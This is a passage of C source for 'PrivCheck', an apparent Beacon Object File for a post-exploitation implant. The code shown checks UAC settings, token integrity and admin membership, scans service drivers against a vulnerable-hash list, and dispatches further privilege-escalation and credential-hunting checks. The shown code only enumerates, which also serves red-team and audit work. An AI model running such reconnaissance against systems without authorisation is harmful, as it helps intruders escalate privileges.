    BOOL bIsAdmin = FALSE, bIsElevated = FALSE;
    PSID pAdminSid = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    BeaconPrintf(CALLBACK_OUTPUT, "=== UAC Status Check ===\n");

    lResult = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_READ, &hKey);
    if (lResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] Failed to open registry key. Error: %ld\n", lResult);
        return;
    }

    dwSize = sizeof(DWORD);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "EnableLUA", NULL, &dwType, (LPBYTE)&dwEnableLUA, &dwSize);
    if (lResult == ERROR_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] UAC Enabled (EnableLUA): %s\n", dwEnableLUA ? "Yes" : "No");

    dwSize = sizeof(DWORD);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "ConsentPromptBehaviorAdmin", NULL, &dwType, (LPBYTE)&dwConsentPrompt, &dwSize);
    if (lResult == ERROR_SUCCESS) {
        const char* desc = "Unknown";
        switch (dwConsentPrompt) {
            case 0: desc = "Elevate without prompting"; break;
            case 1: desc = "Prompt for credentials on secure desktop"; break;
            case 2: desc = "Prompt for consent on secure desktop"; break;
            case 3: desc = "Prompt for credentials"; break;
            case 4: desc = "Prompt for consent"; break;
            case 5: desc = "Prompt for consent for non-Windows binaries"; break;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] ConsentPromptBehaviorAdmin: %lu (%s)\n", dwConsentPrompt, desc);
    }

    dwSize = sizeof(DWORD);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "PromptOnSecureDesktop", NULL, &dwType, (LPBYTE)&dwSecureDesktop, &dwSize);
    if (lResult == ERROR_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] PromptOnSecureDesktop: %s\n", dwSecureDesktop ? "Yes" : "No");

    ADVAPI32$RegCloseKey(hKey); hKey = NULL;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] Failed to open process token\n");
        return;
    }

    hHeap = KERNEL32$GetProcessHeap();

    dwLengthNeeded = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLengthNeeded);
    if (dwLengthNeeded > 0) {
        pTIL = (PTOKEN_MANDATORY_LABEL)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwLengthNeeded);
        if (pTIL && ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded)) {
            PUCHAR pCount = ADVAPI32$GetSidSubAuthorityCount(pTIL->Label.Sid);
            if (pCount && *pCount > 0) {
                PDWORD pLevel = ADVAPI32$GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(*pCount - 1));
                if (pLevel) dwIntegrityLevel = *pLevel;
            }
        }
    }

    if (dwIntegrityLevel < SECURITY_MANDATORY_LOW_RID) BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] Integrity Level: Untrusted\n");
    else if (dwIntegrityLevel < SECURITY_MANDATORY_MEDIUM_RID) BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] Integrity Level: Low\n");
    else if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] Integrity Level: Medium\n");
    else if (dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID) { BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] Integrity Level: High (Elevated)\n"); bIsElevated = TRUE; }
    else { BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] Integrity Level: System\n"); bIsElevated = TRUE; }

    if (ADVAPI32$AllocateAndInitializeSid(&NtAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminSid)) {
        dwLengthNeeded = 0;
        ADVAPI32$GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwLengthNeeded);
        if (dwLengthNeeded > 0) {
            pTokenGroups = (PTOKEN_GROUPS)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwLengthNeeded);
            if (pTokenGroups && ADVAPI32$GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwLengthNeeded, &dwLengthNeeded)) {
                for (DWORD i = 0; i < pTokenGroups->GroupCount; i++) {
                    if (ADVAPI32$EqualSid(pAdminSid, pTokenGroups->Groups[i].Sid)) { bIsAdmin = TRUE; break; }
                }
            }
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] Local Admin Group Member: %s\n", bIsAdmin ? "Yes" : "No");
    if (bIsElevated) BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] Process is running with elevated privileges\n");
    else if (bIsAdmin && dwEnableLUA) BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] User is local admin but NOT elevated (UAC filtered token)\n");
    else if (bIsAdmin && !dwEnableLUA) BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] User is local admin and UAC is disabled\n");
    else BeaconPrintf(CALLBACK_OUTPUT, "[UACSTATUS] User is NOT a local admin\n");

    if (pAdminSid) ADVAPI32$FreeSid(pAdminSid);
    if (pTokenGroups) KERNEL32$HeapFree(hHeap, 0, pTokenGroups);
    if (pTIL) KERNEL32$HeapFree(hHeap, 0, pTIL);
    if (hToken) KERNEL32$CloseHandle(hToken);
}

/* ============================================================
 * CHECK: VulnerableDrivers
 * ============================================================ */
static BOOL CompareHashToVuln(char* DriverHash) {
    int i = 0;
    while (VulnerableHashes[i]) {
        if (MSVCRT$_stricmp(VulnerableHashes[i], DriverHash) == 0) return TRUE;
        i++;
    }
    return FALSE;
}

static void resolveDriverImagePath(char* imagePath, char* resolvedPath, size_t pathSize) {
    char szSystemRoot[MAX_PATH * 2];
    if (!KERNEL32$GetEnvironmentVariableA("SystemRoot", szSystemRoot, sizeof(szSystemRoot))) return;

    if (MSVCRT$_strnicmp(imagePath, "\\SystemRoot\\", 12) == 0) {
        USER32$wsprintfA(resolvedPath, "%s%s", szSystemRoot, imagePath + 11);
    } else if (MSVCRT$_strnicmp(imagePath, "System32\\", 9) == 0) {
        USER32$wsprintfA(resolvedPath, "%s\\%s", szSystemRoot, imagePath);
    } else if (MSVCRT$_strnicmp(imagePath, "\\??\\", 4) == 0) {
        MSVCRT$strncpy(resolvedPath, imagePath + 4, pathSize - 1);
        resolvedPath[pathSize - 1] = '\0';
    } else {
        MSVCRT$strncpy(resolvedPath, imagePath, pathSize - 1);
        resolvedPath[pathSize - 1] = '\0';
    }
}

static BOOL CalculateHash(char * szFilePath, char szFileHash[65], const char * szHashAlg) {
    HANDLE hFile;
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    BOOL bResult;
    BYTE rgbFile[BUFSIZE];
    DWORD cbRead, cbHash;
    BYTE rgbHash[SHA256LEN];
    CHAR rgbDigits[] = "0123456789abcdef";
    ALG_ID hashAlgId;
    DWORD hashLen;

    if (MSVCRT$_stricmp(szHashAlg, "SHA1") == 0)        { hashAlgId = CALG_SHA1;   hashLen = SHA1LEN;   }
    else if (MSVCRT$_stricmp(szHashAlg, "SHA256") == 0)  { hashAlgId = CALG_SHA_256; hashLen = SHA256LEN; }
    else if (MSVCRT$_stricmp(szHashAlg, "MD5") == 0)     { hashAlgId = CALG_MD5;    hashLen = MD5LEN;    }
    else return FALSE;

    cbHash = hashLen;
    hFile = KERNEL32$CreateFileA(szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) { KERNEL32$CloseHandle(hFile); return FALSE; }
    if (!ADVAPI32$CryptCreateHash(hProv, hashAlgId, 0, 0, &hHash)) { KERNEL32$CloseHandle(hFile); ADVAPI32$CryptReleaseContext(hProv, 0); return FALSE; }

    while ((bResult = KERNEL32$ReadFile(hFile, rgbFile, BUFSIZE, &cbRead, NULL))) {
        if (cbRead == 0) break;
        if (!ADVAPI32$CryptHashData(hHash, rgbFile, cbRead, 0)) {
            ADVAPI32$CryptReleaseContext(hProv, 0); ADVAPI32$CryptDestroyHash(hHash); KERNEL32$CloseHandle(hFile); return FALSE;
        }
    }
    if (!bResult) { ADVAPI32$CryptReleaseContext(hProv, 0); ADVAPI32$CryptDestroyHash(hHash); KERNEL32$CloseHandle(hFile); return FALSE; }

    if (ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0)) {
        for (DWORD i = 0; i < cbHash; i++) {
            szFileHash[i * 2] = rgbDigits[rgbHash[i] >> 4];
            szFileHash[i * 2 + 1] = rgbDigits[rgbHash[i] & 0xf];
        }
        szFileHash[cbHash * 2] = '\0';
        ADVAPI32$CryptDestroyHash(hHash); ADVAPI32$CryptReleaseContext(hProv, 0); KERNEL32$CloseHandle(hFile);
        return TRUE;
    }
    ADVAPI32$CryptDestroyHash(hHash); ADVAPI32$CryptReleaseContext(hProv, 0); KERNEL32$CloseHandle(hFile);
    return FALSE;
}

void CheckVulnerableDrivers() {
    HKEY servicesKey;
    char resolvedPath[MAX_PATH];
    int NumOfVulnDrivers = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "=== Vulnerable Drivers Check ===\n");

    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\", 0, KEY_READ, &servicesKey) == ERROR_SUCCESS) {
        char serviceSubkeyName[256];
        DWORD subkeyIndex = 0;
        DWORD subkeyNameSize = sizeof(serviceSubkeyName);
        while (ADVAPI32$RegEnumKeyExA(servicesKey, subkeyIndex++, serviceSubkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            HKEY imagePathKey;
            if (ADVAPI32$RegOpenKeyExA(servicesKey, serviceSubkeyName, 0, KEY_READ, &imagePathKey) == ERROR_SUCCESS) {
                char imagePathValue[1024];
                DWORD valueSize = sizeof(imagePathValue);
                if (ADVAPI32$RegGetValueA(imagePathKey, NULL, "ImagePath", RRF_RT_REG_SZ, NULL, &imagePathValue, &valueSize) == ERROR_SUCCESS) {
                    if (imagePathValue[0] != '\0' && MSVCRT$strstr(imagePathValue, ".sys") != NULL) {
                        resolveDriverImagePath(imagePathValue, resolvedPath, sizeof(resolvedPath));
                        char FileHash[65];
                        const char* HashAlgos[] = { "SHA1", "SHA256", "MD5" };
                        for (int i = 0; i < 3; i++) {
                            if (CalculateHash(resolvedPath, FileHash, HashAlgos[i])) {
                                if (CompareHashToVuln(FileHash)) {
                                    BeaconPrintf(CALLBACK_OUTPUT, "[VULN_DRIVER] Service \"%s\" has a vulnerable driver: %s - Hash: %s\n", serviceSubkeyName, resolvedPath, FileHash);
                                    NumOfVulnDrivers++;
                                    break;
                                }
                            }
                        }
                    }
                }
                ADVAPI32$RegCloseKey(imagePathKey);
            }
            subkeyNameSize = sizeof(serviceSubkeyName);
        }
        ADVAPI32$RegCloseKey(servicesKey);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[VULN_DRIVER] Found a total of %d vulnerable drivers\n", NumOfVulnDrivers);
}

/* ============================================================
 * Check registry: name -> function pointer
 * ============================================================ */
typedef void (*CheckFunc)(void);
typedef struct {
    const char* name;
    CheckFunc   func;
} CheckEntry;

static CheckEntry g_checks[] = {
    { "alwayselevated",  CheckAlwaysInstallElevated },
    { "autologon",       CheckAutologon },
    { "credmanager",     CheckCredentialManager },
    { "hijackablepath",  CheckHijackablePath },
    { "modautorun",      CheckModifiableAutorun },
    { "modsvc",          CheckModifiableService },
    { "tokenpriv",       CheckTokenPrivileges },
    { "unattendfiles",   CheckUnattendFiles },
    { "unquotedsvc",     CheckUnquotedServicePath },
    { "pshistory",       CheckPowerShellHistory },
    { "uacstatus",       CheckUACStatus },
    { "vulndrivers",     CheckVulnerableDrivers },
};

#define NUM_CHECKS (sizeof(g_checks) / sizeof(g_checks[0]))

/* ============================================================
 * BOF Entry Point
 * ============================================================ */
void go(char *args, int alen) {
    datap parser;
    char *checks_arg = NULL;
    int checks_arg_len = 0;

    if (alen > 0) {
        BeaconDataParse(&parser, args, alen);
        checks_arg = BeaconDataExtract(&parser, &checks_arg_len);
    }

    if (checks_arg == NULL || checks_arg_len <= 1 || checks_arg[0] == '\0') {
        BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
        BeaconPrintf(CALLBACK_OUTPUT, "  PrivCheck - Running ALL checks\n");
        BeaconPrintf(CALLBACK_OUTPUT, "========================================\n\n");
        for (int i = 0; i < (int)NUM_CHECKS; i++) {
            g_checks[i].func();
            BeaconPrintf(CALLBACK_OUTPUT, "\n");
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
        BeaconPrintf(CALLBACK_OUTPUT, "  PrivCheck - Running selected checks\n");
        BeaconPrintf(CALLBACK_OUTPUT, "========================================\n\n");

        char buf[1024];
        int len = checks_arg_len - 1;
        if (len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
        for (int c = 0; c < len; c++) buf[c] = checks_arg[c];
        buf[len] = '\0';

        char *token = MSVCRT$strtok(buf, ",; ");
        while (token != NULL) {
            BOOL found = FALSE;
            for (int i = 0; i < (int)NUM_CHECKS; i++) {
                if (MSVCRT$_stricmp(token, g_checks[i].name) == 0) {
                    g_checks[i].func();
                    BeaconPrintf(CALLBACK_OUTPUT, "\n");
                    found = TRUE;
                    break;
                }
            }
            if (!found) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Unknown check: %s\n", token);
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Available: alwayselevated, autologon, credmanager, hijackablepath, modautorun, modsvc, tokenpriv, unattendfiles, unquotedsvc, pshistory, uacstatus, vulndrivers\n\n");
            }
            token = MSVCRT$strtok(NULL, ",; ");
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "  PrivCheck - Complete\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
}
